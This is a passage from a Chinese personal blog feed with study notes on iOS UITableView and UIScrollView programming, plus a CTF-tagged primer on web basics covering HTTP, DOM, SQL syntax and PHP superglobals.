可以对传入的编辑模式进行判断</div><div class="line">    if (editingStyle == UITableViewCellEditingStyleDelete) &#123;</div><div class="line">        </div><div class="line">        // 1. 在数据源中把row 对应到 dataArray 下标中的对象 给移除掉</div><div class="line">        [self.dataArray removeObjectAtIndex:indexPath.row];</div><div class="line">        </div><div class="line">        // 2. 刷新数据</div><div class="line">//        [_tableView reloadData];</div><div class="line">//        [_tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">        </div><div class="line">        [_tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">        </div><div class="line">    &#125; else if (editingStyle == UITableViewCellEditingStyleInsert) &#123;</div><div class="line">        </div><div class="line">        // 1. 根据点击的indexPath.row 在数据源中插入heroModel 对象</div><div class="line">        HeroModel *model = [[HeroModel alloc] init];</div><div class="line">        model.name = @&quot;千珏&quot;;</div><div class="line">        </div><div class="line">        [self.dataArray insertObject:model atIndex:indexPath.row];</div><div class="line">        </div><div class="line">        // 2. 刷新数据</div><div class="line">        </div><div class="line">        [_tableView insertRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft ];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">- (UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    //可以通过按钮来改变编辑的模式</div><div class="line">    return UITableViewCellEditingStyleInsert;</div><div class="line">&#125;</div><div class="line">//自定义删除按钮上显示的文本</div><div class="line">- (nullable NSString *)tableView:(UITableView *)tableView titleForDeleteConfirmationButtonForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    return @&quot;咔嚓掉&quot;;</div><div class="line">&#125;</div><div class="line">//当一行cell被取消选中的时候待用</div><div class="line">- (void)tableView:(UITableView *)tableView didDeselectRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    NSLog(@&quot;调用了--- %ld&quot;, indexPath.row);</div><div class="line">&#125;</div><div class="line">//当一行cell被选中的时候调用</div><div class="line">- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 多种代理方法 cell重用 数据模型嵌套 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Web基础]]></title>
      <url>/2017/05/26/Web%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>Web基础<br><a id="more"></a></p>
<h1 id="Web基础"><a href="#Web基础" class="headerlink" title="Web基础"></a>Web基础</h1><h2 id="1-Web发展史"><a href="#1-Web发展史" class="headerlink" title="1.Web发展史"></a>1.Web发展史</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/24BF5CBD-1FC5-4D49-A273-4640CA1D84AE.png" alt="24BF5CBD-1FC5-4D49-A273-4640CA1D84AE" title="" class="">
                <p>24BF5CBD-1FC5-4D49-A273-4640CA1D84AE</p>
            </figure>
<p>各个发展时代安全问题：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/DBB2361A-A844-4014-AE83-AFBAA6756FF7.png" alt="DBB2361A-A844-4014-AE83-AFBAA6756FF7" title="" class="">
                <p>DBB2361A-A844-4014-AE83-AFBAA6756FF7</p>
            </figure>
<h2 id="2-Web流程"><a href="#2-Web流程" class="headerlink" title="2.Web流程"></a>2.Web流程</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/8009CD93-F415-4234-8377-6530045B9D53.png" alt="8009CD93-F415-4234-8377-6530045B9D53" title="" class="">
                <p>8009CD93-F415-4234-8377-6530045B9D53</p>
            </figure>
<h2 id="3-浏览器"><a href="#3-浏览器" class="headerlink" title="3.浏览器"></a>3.浏览器</h2><p>1.首先通过域名获取web服务器IP地址</p>
<p>2.访问web服务器</p>
<h2 id="4-URL协议"><a href="#4-URL协议" class="headerlink" title="4.URL协议"></a>4.URL协议</h2><p>1.url被称作统一资源定位符，就是我们平时在网上输入的网址，可以通过收获地址的方式来进行类比。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/72994992-1FD8-47B6-B91B-3D66842C28B2.png" alt="72994992-1FD8-47B6-B91B-3D66842C28B2" title="" class="">
                <p>72994992-1FD8-47B6-B91B-3D66842C28B2</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/378425CB-9517-47B4-A322-8E67FC5883AB.png" alt="378425CB-9517-47B4-A322-8E67FC5883AB" title="" class="">
                <p>378425CB-9517-47B4-A322-8E67FC5883AB</p>
            </figure>
<h2 id="5-HTTP协议"><a href="#5-HTTP协议" class="headerlink" title="5.HTTP协议"></a>5.HTTP协议</h2><p>同样通过快递的方式进行类比</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/8B9F21C7-27E8-4200-92D9-99948EBDE16B.png" alt="8B9F21C7-27E8-4200-92D9-99948EBDE16B" title="" class="">
                <p>8B9F21C7-27E8-4200-92D9-99948EBDE16B</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/03ABEF1C-6F9A-4152-9D34-45420FAE6859.png" alt="03ABEF1C-6F9A-4152-9D34-45420FAE6859" title="" class="">
                <p>03ABEF1C-6F9A-4152-9D34-45420FAE6859</p>
            </figure>
<p>HTTP请求中的Referer:</p>
<blockquote>
<p>告知服务器该请求的来源（浏览器自动加上）</p>
<p>统计流量：CNZZ,百度统计</p>
<p>判断来源合法性：防止盗链、防止CSRF漏洞</p>
</blockquote>
<h2 id="6-前端知识补充"><a href="#6-前端知识补充" class="headerlink" title="6.前端知识补充"></a>6.前端知识补充</h2><h3 id="1-内联框架"><a href="#1-内联框架" class="headerlink" title="1.内联框架"></a>1.内联框架</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--iframe 用于在网页内显示网页。--&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"/example/html/demo_iframe.html"</span> <span class="attr">name</span>=<span class="string">"iframe_a"</span> <span class="attr">width</span>=<span class="string">"800"</span> <span class="attr">height</span>=<span class="string">"600"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.w3school.com.cn"</span> <span class="attr">target</span>=<span class="string">"iframe_a"</span>&gt;</span>W3School.com.cn<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>注释：<span class="tag">&lt;/<span class="name">b</span>&gt;</span>由于链接的目标匹配 iframe 的名称，所以链接会在 iframe 中打开。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="2-HTML-DOM"><a href="#2-HTML-DOM" class="headerlink" title="2.HTML DOM"></a>2.HTML DOM</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/7DE16B8F-BBF0-4FF1-8E3B-F477B488EA96.png" alt="7DE16B8F-BBF0-4FF1-8E3B-F477B488EA96" title="" class="">
                <p>7DE16B8F-BBF0-4FF1-8E3B-F477B488EA96</p>
            </figure>
<h3 id="3-javaScript-DOM函数"><a href="#3-javaScript-DOM函数" class="headerlink" title="3.javaScript DOM函数"></a>3.javaScript DOM函数</h3><p>加载js的方式：HTML的script标签之间、HTML的事件属性中，如onclick、浏览器的JavaScript控制台中。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  function changetext(id)&#123;</div><div class="line">    id.innerHTMl = "Do you like me";</div><div class="line">  &#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;h1 onclick = "changetext(this)"&gt;请点击&lt;/h1&gt;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/A5DB43A7-D8B2-4452-8F7D-3D94BBF0D593.png" alt="A5DB43A7-D8B2-4452-8F7D-3D94BBF0D593" title="" class="">
                <p>A5DB43A7-D8B2-4452-8F7D-3D94BBF0D593</p>
            </figure> 
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/62D4BA2B-61AF-4555-924A-1AE2C2807C8C.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>document.write写入html内容,上方样例是写入系统的时间，同样也可以写入元素。还可以在网页的源代码上进行自定义的修改。</p>
<p>以上使用JavaScript访问和操作HTML就是JavaScript DOM的操作</p>
<p>DOM的本质就是连接Web页面和编程语言，JavaScript + DOM访问和操作HTML文档的标准方法。</p>
<h3 id="4-JavaScript-BOM函数"><a href="#4-JavaScript-BOM函数" class="headerlink" title="4.JavaScript BOM函数"></a>4.JavaScript BOM函数</h3><p>获取浏览器信息，操作浏览器行为，连接浏览器和编程语言</p>
<blockquote>
<p>警告弹窗 alert()</p>
<p>确认弹窗 confirm()</p>
<p>提示弹窗 prompt()</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/D549F44E-070D-4884-85DA-1BCFF555F078.png" alt="D549F44E-070D-4884-85DA-1BCFF555F078" title="" class="">
                <p>D549F44E-070D-4884-85DA-1BCFF555F078</p>
            </figure>
<p>TIPS:常用于简单的调试和信息展示，如XSS漏洞的测试。 </p>
<p>具体的一些操作行为；</p>
<p>window.location:获取／控制用户页面URL</p>
<p>window.location = “<a href="http://www.baidu.com&quot;是直接进行页面的跳转" target="_blank" rel="external">http://www.baidu.com&quot;是直接进行页面的跳转</a></p>
<p>window.screen:获取浏览器屏幕信息</p>
<p>window.navigator:获取访问者浏览信息</p>
<p>window.open/close:操作浏览器窗口</p>
<h2 id="7-服务端环境"><a href="#7-服务端环境" class="headerlink" title="7.服务端环境"></a>7.服务端环境</h2><h3 id="1-Web服务端概述-web服务端包括数据服务和web服务"><a href="#1-Web服务端概述-web服务端包括数据服务和web服务" class="headerlink" title="1.Web服务端概述:web服务端包括数据服务和web服务"></a>1.Web服务端概述:web服务端包括数据服务和web服务</h3><p>静态页面时期：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/6517E706-913F-439B-AA1E-1FFC8FD83FDF.png" alt="6517E706-913F-439B-AA1E-1FFC8FD83FDF" title="" class="">
                <p>6517E706-913F-439B-AA1E-1FFC8FD83FDF</p>
            </figure></p>
<p>动态页面时期：php文件通过语言解释器调用数据库中的数据，数据库返回相应数据，通过语言解释器传递给服务器相应的html文件，使用户端得以访问。<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/C6E24980-02F9-434B-BD52-0714115FBB83.png" alt="C6E24980-02F9-434B-BD52-0714115FBB83" title="" class="">
                <p>C6E24980-02F9-434B-BD52-0714115FBB83</p>
            </figure></p>
<p>目前流行的架构分析：</p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th>web服务</th>
<th>解释执行环境</th>
<th>数据库服务</th>
<th>WEB服务端</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows server</td>
<td>IIS</td>
<td>ASP(.NET)</td>
<td>SQL Server</td>
<td>.NET</td>
</tr>
<tr>
<td>Linux</td>
<td>Apache</td>
<td>PHP</td>
<td>MySQL</td>
<td>LAMP</td>
</tr>
<tr>
<td>UNIX/Windows</td>
<td>Tomcat</td>
<td>JSP</td>
<td>Oracle</td>
<td>J2EE</td>
</tr>
</tbody>
</table>
<p>Apache服务：</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/85235B63-733C-46FD-90D4-F6C81CB72E9F.png" alt="85235B63-733C-46FD-90D4-F6C81CB72E9F"></p>
<p>其中DNS服务器主要是针对公网访问，如果只是本机访问可以在HOSTS文件中自定义域名。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/13A5F48C-4B16-4F56-98E4-BB4C97BD1FDB.png" alt="13A5F48C-4B16-4F56-98E4-BB4C97BD1FDB" title="" class="">
                <p>13A5F48C-4B16-4F56-98E4-BB4C97BD1FDB</p>
            </figure>
<h3 id="2-SQL概述-结构化查询语言"><a href="#2-SQL概述-结构化查询语言" class="headerlink" title="2.SQL概述(结构化查询语言)"></a>2.SQL概述(结构化查询语言)</h3><p>与网络商城对比可以更加形象的理解</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/DF076950-BC52-4C06-9A8A-983058605E18.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>数据库操作：</p>
<table>
<thead>
<tr>
<th>创建数据库</th>
<th>CREATE DATABASE websecurity;</th>
</tr>
</thead>
<tbody>
<tr>
<td>查看数据库</td>
<td>SHOW databases;</td>
</tr>
<tr>
<td>切换数据库</td>
<td>USE websecurity;</td>
</tr>
<tr>
<td>删除数据库</td>
<td>DROP DATABASE websecurity;</td>
</tr>
</tbody>
</table>
<p>TIPS:SQL语句对大小写不敏感，分号作为语句的结束，程序中会自动补充</p>
<p>表的操作：</p>
<table>
<thead>
<tr>
<th>创建表</th>
<th>CREATE  TABLE teacher( id int(4) not null primary key auto_increment, name char(20) not null, sex char(10) not null, addr char(20) not null );</th>
</tr>
</thead>
<tbody>
<tr>
<td>删除表</td>
<td>DROP TABLE teacher; DELETE FROM teacher name=”xxx”;</td>
</tr>
<tr>
<td>插入表</td>
<td>INSERT INTO teacher (name, sex, addr) VALUES (‘pzp’, ‘male’, ‘wuhan’);</td>
</tr>
<tr>
<td>查询表</td>
<td>select * from teacher;</td>
</tr>
<tr>
<td>更新表</td>
<td>UPDATE teacher SET name = ‘neo’ where addr=”wuhan”</td>
</tr>
</tbody>
</table>
<p>SQL语法讲解：</p>
<p>1.where语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#进行需要信息的查找</div><div class="line">select 你要的信息 from 数据表（或多个） where 满足的条件（条件判断）</div><div class="line">select name from teacher where addr=&quot;wuhan&quot; and sex=&quot;male&quot;</div></pre></td></tr></table></figure>
<p>2.order by语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select 你要的信息 from 数据表（或多个） order by 字段 ASC/DESC</div><div class="line">select * from teacher order by name #对名字进行升序排序，默认是ASC,name也可以用数字替代，代表是第几类</div></pre></td></tr></table></figure>
<p>3.UNION语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#合并两张表,不会显示重复的数据，如果要显示重复的数据，要用union all</div><div class="line">select 你要的信息 from 数据表1 union select 你要的信息 from 数据表2</div><div class="line">select name from teacher union select name from student</div></pre></td></tr></table></figure>
<p>4.导入sql文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#注意，因为mysql会自动注释掉斜杠，所以在路径中要多加一个‘／’</div><div class="line">source 文件路径 sql</div></pre></td></tr></table></figure>
<p>5.常见内置函数<a href="http://www.cnblogs.com/noway-neway/p/5211401.html" target="_blank" rel="external">参考</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#数学函数</div><div class="line">abs(x),sqrt(x),exp(x)...</div><div class="line">#字符串函数</div><div class="line">INSERT(str,pos,len,newstr)</div><div class="line">/*返回str,其起始于pos，长度为len的子串被newstr取代。</div><div class="line">1. 若pos不在str范围内，则返回原字符串str</div><div class="line">2. 若str中从pos开始的子串不足len,则将从pos开始的剩余字符用newstr取代</div><div class="line">3. 计算pos时从1开始，若pos=3,则从第3个字符开始替换</div><div class="line">*/...</div><div class="line">#日期和时间函数</div><div class="line">UTC_DATE():返回当前世界标准时间</div><div class="line">EXTRACT(unit FROM date)：提取日期时间中的要素</div><div class="line">e.g-&gt; SELECT EXTRACT(YEAR FROM &apos;2009-07-02&apos;); ##2009</div><div class="line">#条件判断函数</div><div class="line">IF(expr1,expr2,expr3)</div><div class="line">#如果expr1不为0或者NULL,则返回expr2的值，否则返回expr3的值</div><div class="line">IFNULL(expr1,expr2)</div><div class="line">#如果expr1不为NULL,返回expr1,否则返回expr2</div><div class="line">CASE value WHEN [compare_value] THEN result [WHEN [compare_value] THEN result ...] [ELSE result] END</div><div class="line">#当compare_value=value时返回result</div><div class="line">CASE WHEN [condition] THEN result [WHEN [condition] THEN result ...] [ELSE result] END</div><div class="line">#当condition为TRUE时返回result</div><div class="line">#系统信息函数</div><div class="line">DATABASE()，SCHEMA()：显示当前使用的数据库</div><div class="line">#格式或类型转化函数</div><div class="line">FORMAT(X,D[,locale])：将数字X转化成&apos;#,###,###.##&apos;格式，D为保留的小数位数</div><div class="line">CONV(N,from_base,to_base)：改变数字N的进制，返回值为该进制下的数字构成的字符串</div></pre></td></tr></table></figure>
<h2 id="3-php概述（超文本预处理器）"><a href="#3-php概述（超文本预处理器）" class="headerlink" title="3.php概述（超文本预处理器）"></a>3.php概述（超文本预处理器）</h2><h3 id="php基本语法的讲解"><a href="#php基本语法的讲解" class="headerlink" title="php基本语法的讲解"></a>php基本语法的讲解</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/3831EE56-8DD6-4407-9581-28479A56A625.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>串接点的作用是连接不同的字符串</p>
<p>TIPS：变量大小写代表的是不同的变量</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/440C424F-04CE-43EE-9AA2-11A58879F254.png" alt="440C424F-04CE-43EE-9AA2-11A58879F254" title="" class="">
                <p>440C424F-04CE-43EE-9AA2-11A58879F254</p>
            </figure>
<h3 id="php实例（一），返回表单中的信息："><a href="#php实例（一），返回表单中的信息：" class="headerlink" title="php实例（一），返回表单中的信息："></a>php实例（一），返回表单中的信息：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TIPS：当http请求类型为GET的时候，后端变量就要用$_GET，如果请求类型是POST的话，后端变量就要用$_POST，当然还可以用$_REQUEST,可以接受两种传值。</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/E514CDDC-3EC9-43EC-B02D-C8C36CEEF159.png" alt="E514CDDC-3EC9-43EC-B02D-C8C36CEEF159" title="" class="">
                <p>E514CDDC-3EC9-43EC-B02D-C8C36CEEF159</p>
            </figure>
<h3 id="php实例（二），文件上传："><a href="#php实例（二），文件上传：" class="headerlink" title="php实例（二），文件上传："></a>php实例（二），文件上传：</h3><blockquote>
<p>在黄色部分判断文件是否存在</p>
<p>红色部分打印文件的信息</p>
<p>绿色部分将文件保存在相应的目录下</p>
</blockquote>
<p><img src="http://omunhj2f1.bkt.clouddn.com/24BF7A3C-7A6C-4E8D-810E-B69B88379C14.png" alt="upload_file.php"></p>
<p>php中常见的系统变量：</p>
<table>
<thead>
<tr>
<th>$_GLOBALS[]</th>
<th>储存当前脚本中的所有全局变量，其KEY为变量名，VALUE为变量值</th>
</tr>
</thead>
<tbody>
<tr>
<td>$SERVER[]</td>
<td>当前WEB服务器变量数组</td>
</tr>
<tr>
<td>$GET[]</td>
<td>存储以GET方法提交表单中的数据</td>
</tr>
<tr>
<td>$_POST[]</td>
<td>存储以POST方法提交表单中的数据</td>
</tr>
<tr>
<td>$_COOKIE[]</td>
<td>取得或设置用户浏览器Cookies中存储的变量数组</td>
</tr>
<tr>
<td>$_FILES[]</td>
<td>存储上传文件提交到当前脚本的数据</td>
</tr>
<tr>
<td>$_ENV[]</td>
<td>存储当前WEB环境变量</td>
</tr>
<tr>
<td>$_REQUEST[]</td>
<td>存储提交表单中所有请求数组，其中包括$_GET、$_POST、$_COOKIE和$_SESSION中的所有内容</td>
</tr>
<tr>
<td>$_SESSION[]</td>
<td>存储当前脚本的会话变量数组</td>
</tr>
</tbody>
</table>
<p>打印服务器相关的信息；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">echo</span> <span class="string">"服务器名称："</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].<span class="string">"&lt;br&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"网站根目录："</span>.$_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">"&lt;br&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"当前网页相对路径："</span>.$_SERVER[<span class="string">'PHP_SELF'</span>].<span class="string">"&lt;br&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"当前网页绝对路径："</span>.$_SERVER[<span class="string">'SCRIPT_FILENAME'</span>].<span class="string">"&lt;br&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"服务器环境变量："</span>.$_SERVER[<span class="string">'PATH'</span>].<span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">include</span> <span class="string">'upload_file.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>TIPS:include/require:包含文件</p>
<p>include:警告，脚本继续</p>
<p>require:错误，停止脚本</p>
<h3 id="使用php对数据库进行操作"><a href="#使用php对数据库进行操作" class="headerlink" title="使用php对数据库进行操作"></a>使用php对数据库进行操作</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/7B4413D8-D8AA-4204-97E2-818C0E91A648.png" alt="" title="" class="">
                <p></p>
            </figure>]]></content>
      
        <categories>
            
            <category> 基本知识学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习(四)]]></title>
      <url>/2017/05/23/iOS-UI%E5%AD%A6%E4%B9%A0-%E5%9B%9B/</url>
      <content type="html"><![CDATA[<p>UI初步（四）<br><a id="more"></a></p>
<h2 id="1-自定义一个coverView"><a href="#1-自定义一个coverView" class="headerlink" title="1.自定义一个coverView"></a>1.自定义一个coverView</h2><blockquote>
<p>首先要创建一个coverView的类</p>
<p>在这个类当中重写初始化他的方法</p>
<p>在ViewController里面进行对象的实例化并加入其父控件(注意，最后一定要赋值回去：coverView.model = _model)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#import &quot;CoverView.h&quot;</div><div class="line"></div><div class="line">@implementation CoverView</div><div class="line"></div><div class="line">-(instancetype)initWithFrame:(CGRect)frame&#123;</div><div class="line">  if (self == [super initWithFrame:frame])&#123;</div><div class="line">  	self.backgroundColor = [UIColor blackColor];</div><div class="line">  	self.alpha = 0.6;</div><div class="line">    CGSize *viewSize = [UIScreen mainScreen].bounds.size;</div><div class="line">    UILabel *nameLabel = [UILabel alloc]initWithFrame:CGRectMake(0,0,viewSize.width,20)</div><div class="line">      //以下省略对nameLabel的其他设置</div><div class="line">      [self addSubview:nameLabel];</div><div class="line">  &#125;</div><div class="line">  return self;</div><div class="line">&#125;</div><div class="line">//注意，在main.storyboard里面，越靠近view离底层越近</div></pre></td></tr></table></figure>
<h2 id="2-UIScrollView控件（滚动，缩放）"><a href="#2-UIScrollView控件（滚动，缩放）" class="headerlink" title="2.UIScrollView控件（滚动，缩放）"></a>2.UIScrollView控件（滚动，缩放）</h2><p>可以滚动的控件的父类UIScrollView或者继承自UIScrollView，首先添加一个scrollView，再向其中添加子view，并设置相关属性。</p>
<p>1.contentSize属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//限定滚动的范围，在设置的时候，一定要比scrollerView的Size大，否则不会产生滚动的效果，如果宽度设置为0，就表示在横向中不能滚动</div><div class="line">_scrollView.contentSize = CGSizeMake(1024, 768);</div></pre></td></tr></table></figure>
<p>2.滚动指示器属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">_scrollView.showsVerticalScrollIndicator=YES;//垂直滚动指示器</div><div class="line">_scrollView.showsHorizontalScrollIndicator=YES;//水平滚动指示器</div></pre></td></tr></table></figure>
<p>3.弹簧效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">_scrollView.bounces = YES;//弹簧效果，默认是YES，一般不关闭不设置contentSize的时候弹簧效果开启，但是看不到</div><div class="line">//设置下面属性后,就算不设置contentSize，也会有弹簧效果,前提是_scrollView.bounces的属性是YES</div><div class="line">_scrollView.alwaysBounceHorizon = YES;</div><div class="line">_scrollView.alwaysBounceVertical = YES;</div></pre></td></tr></table></figure>
<p>4.内边界</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//没有设置contentInset的时候，imageView默认会停留在初始位置，contentInset会停留在设置的内边距位置，</div><div class="line">_scrollView.contentInset = UIEdgeInsetsMake(10,10,10,10);</div></pre></td></tr></table></figure>
<p>5.偏移量</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/C275B81E-725D-4560-92C8-2FC5C7D40AE2.png" alt="C275B81E-725D-4560-92C8-2FC5C7D40AE2" title="" class="">
                <p>C275B81E-725D-4560-92C8-2FC5C7D40AE2</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_scrollView.contentOffset = CGPointMake(100, 100);</div></pre></td></tr></table></figure>
<p>6.不能滚动的原因小结</p>
<blockquote>
<p>contentsize比scrollView的size小</p>
<p>scrollView.userInteractionEnabled = NO;禁止了用户交互（限制更大）</p>
<p>_scrollView.scrollEnabled = NO;禁止滚动</p>
</blockquote>
<p>7.手动修改offset</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//通过动画和按钮实现手动的流畅滚动效果</div><div class="line">-(IBAction)didClick:(id)sender&#123;</div><div class="line">  CGPoint offset = _scrollView.contentOffset;</div><div class="line">  offset.x += 20;</div><div class="line">  offset.y += 20;</div><div class="line">  //动画效果实现(方法1)</div><div class="line">  [UIView animateWithDuration:0.5 animations:^&#123;</div><div class="line">    _scrollView.contentOffset = offset;</div><div class="line">  &#125;];</div><div class="line">  //设置contentoffset的时候有动画效果（方法2）</div><div class="line">  [_scrollView setContentOffset:offset animated:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3-代理的使用代理设计模式"><a href="#3-代理的使用代理设计模式" class="headerlink" title="3.代理的使用代理设计模式"></a>3.代理的使用<a href="http://www.jianshu.com/p/2113ffe54b30" target="_blank" rel="external">代理设计模式</a></h2><p>使用代理的情况：自己不能做或者不想做</p>
<p>1.制定协议以及代理方法，定义一个代理的属性</p>
<p>2.遵守协议，实现对应的代理方法</p>
<p>3.制定协议者在适当的时候调用代理方法</p>
